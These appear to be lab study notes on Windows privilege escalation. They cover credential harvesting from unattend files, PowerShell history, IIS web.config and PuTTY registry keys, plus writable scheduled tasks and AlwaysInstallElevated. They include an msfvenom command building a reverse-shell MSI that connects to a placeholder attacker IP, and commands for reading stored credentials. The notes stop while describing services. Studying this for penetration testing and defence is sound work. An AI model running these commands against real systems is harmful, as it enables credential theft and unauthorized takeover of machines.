
## Windows Priv Esc
Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

### Account types
| Type | Description |
|-|-|
| **User accounts** | - |
| Administrators | These users have the most privileges. They can change any system configuration parameter and access any file in the system. Any user with administrative privileges will be part of the `Administrators group`. |
| Standard Users | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. Part of the `Users group`. |
| **OS / built-in accounts** | - |
| SYSTEM / LocalSystem | Used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| Local Service | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| Network Service | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network. |

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

## Harvesting Passwords from Usual Spots
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

### Unattended
When installing Windows on a large number of hosts, administrators may use `Windows Deployment Services`, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are `referred to as unattended installations` as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

    As part of these files, you might encounter credentials:
    ```xml
    <Credentials>
        <Username>Administrator</Username>
        <Domain>thm.local</Domain>
        <Password>MyPassword123</Password>
    </Credentials>
    ```

### Powershell history
 If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

### Save Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials: `cmdkey /list`.

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option: `runas /savecred /user:admin cmd.exe`.


### IIS Configuration (Internet Information Services)
This is the default web server on Windows installations.
The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms.
Depending on the installed version of IIS, we can find web.config in one of the following locations:
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

Here is a quick way to find database connection strings on the file: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`.

Output may look like:
```xml
<connectionStrings>
    <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
</connectionStrings>
```

### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems.
Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use.
While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`.

## Other quick wins
### Scheduled tasks
Look for a scheduled task that either lost its binary or a binary you can modify.
Scheduled tasks can be listed from the command line using the `schtasks` command without any options.

To retrieve detailed information about any of the services, you can use a command like: `schtasks /query /tn vulntask /fo list /v`. You will get lots of information about the task, but what matters for us is the `Task to Run` parameter which indicates what gets executed by the scheduled task, and the `Run As User` parameter, which shows the user that will be used to execute the task.

Example output:

```
Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/21/2025 9:48:47 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

If our current user can modify or overwrite the `Task to Run` executable, we can control what gets executed by the user, resulting in a simple privilege escalation.
To check the file permissions on the executable, we use `icacls` like so: `icacls c:\tasks\schtask.bat`.

Example output:

```
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the `BUILTIN\Users` group has `full access (F)` over the task's binary.
This means we can modify the .bat file and insert any payload we like.
All that's left to do is change the bat file to spawn a reverse shell.

### AlwaysInstallElevated
Windows installer files (also known as `.msi` files) are used to install applications on the system and usually run with the privilege level of the user that starts it.
However, these can be configured to run with higher privileges from any user account (even unprivileged ones).
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method `requires two registry values to be set`.
You can query these from the command line using the commands below.
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

If these are set, you can generate a malicious .msi file using msfvenom:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

## Abusing Service Misconfigurations
### Windows Services
Windows services are managed by the `Service Control Manager (SCM)`.
The SCM is a process in charge of managing the state of services as needed, `checking the current status of any given service` and generally `providing a way to configure services`.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started.
It is important to note that `service executables implement special functions` to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully.
`Each service also specifies the user account under which the service will run`.
To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```